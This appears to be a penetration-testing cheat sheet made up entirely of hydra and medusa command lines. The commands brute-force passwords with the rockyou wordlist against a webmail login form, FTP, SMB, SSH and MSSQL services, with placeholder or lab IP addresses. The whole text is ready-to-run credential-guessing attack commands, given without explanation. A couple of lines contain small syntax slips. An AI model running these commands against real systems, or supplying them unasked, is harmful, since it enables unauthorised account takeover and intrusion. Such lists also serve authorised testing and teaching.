

```
hydra -l user@acme.com -P /usr/share/wordlists/rockyou.txt $IP http-post-form '/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect'
medusa -h ip.ip.ip.ip -u USERNAME -P /usr/share/wordlists/rockyou.txt -M ftp
hydra -L USER_LIST -P PASS_LIST -f -o /data/results/10.10.1.22/scans/10.10.1.22_21_ftphydra.txt -u 10.10.1.22 -s 21 ftp
hydra -t 1 -V -f -l USER -P /usr/share/wordlists/rockyou.txt $ip smb
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt -t 10 IP.IP.IP.IP ssh -s 22
medusa -u USER -P /usr/share/wordlists/rockyou.txt -e ns -h IP.IP.IP.IP:22 - 22 -M ssh
hydra -L user.txt –P pass.txt 192.168.1.128 mssql
```

